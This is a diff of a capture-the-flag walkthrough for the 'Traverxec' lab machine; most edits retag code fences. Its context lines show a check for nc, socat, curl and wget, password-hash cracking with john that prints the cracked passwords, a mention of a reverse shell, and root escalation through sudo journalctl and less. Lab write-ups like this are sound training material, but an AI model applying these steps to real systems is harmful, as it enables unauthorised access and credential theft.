@@ -148,7 +148,7 @@ In an effort to keep this walkthrough brief, I'll only discuss the notable resul
 
 - Lots of useful tools are already on the box:
 
-  ```
+  ```bash
   which nc netcat socat curl wget python perl php
   /usr/bin/nc
   /usr/bin/netcat
@@ -185,17 +185,14 @@ Possible Hashs:
 
 OK, so it's MD5. That should be recognized right away...
 
-```
+```bash
  echo 'david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/' > hash.txt
-```
-
-```
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.john
 ```
 
 And it found a password:
 
-```
+```http
 Nowonly4me       (david)  
 ```
 
@@ -249,7 +246,7 @@ http://traverxec.htb/~david/subdir/
 
 In this case, using the rev shell I searched what was the contents:
 
-```
+```bash
 www-data@traverxec:/home$ ls -laR /home/david/public_www
 /home/david/public_www:
 total 16
@@ -297,7 +294,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john
 
 Yep! got a result almost immediately:
 
-```
+```http
 hunter           (id_rsa)    
 ```
 
@@ -317,7 +314,7 @@ cat /home/david/user.txt
 
 Taking a look around, it seems `david` has their own `bin` directory on the path:
 
-```
+```bash
 david@traverxec:~$ echo $PATH
 /home/david/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
 ```
@@ -326,7 +323,7 @@ That's a bit odd. This could lead to path abuse possibly. I might come back to t
 
 There are two files within: server-stats.head and server-stats.sh. This is server-stats.head:
 
-```
+```http
                                                                           .----.
                                                               .---------. | == |
    Webserver Statistics and Data                              |.-"""""-.| |----|
@@ -345,7 +342,7 @@ There are two files within: server-stats.head and server-stats.sh. This is serve
 
 And here's server-stats.sh
 
-```
+```bash
 #!/bin/bash
 
 cat /home/david/bin/server-stats.head
@@ -366,7 +363,7 @@ Since journalctl invokes `less` usually, and `less` has a command prompt inside,
 
 Just run the `sudo` part of the final line by itself
 
-```
+```bash
 /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
 ```
 
